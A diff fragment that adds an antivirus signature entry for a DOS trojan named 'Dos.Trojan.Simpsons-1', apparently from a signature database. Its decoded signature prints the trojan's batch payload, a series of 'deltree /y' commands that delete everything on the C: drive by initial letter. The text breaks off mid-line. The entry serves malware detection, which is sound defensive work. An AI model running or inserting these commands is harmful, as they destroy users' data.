@@ -1,0 +1,13 @@
+VIRUS NAME: Dos.Trojan.Simpsons-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+o off
+cls
+c:
+cd\
+deltree /y a* b* c* d* e* 
+deltree /y f* g* h* i* j*
+deltree /y k* l* m* n* ñ*
+deltree /y o* p* q* r* s* 
+de
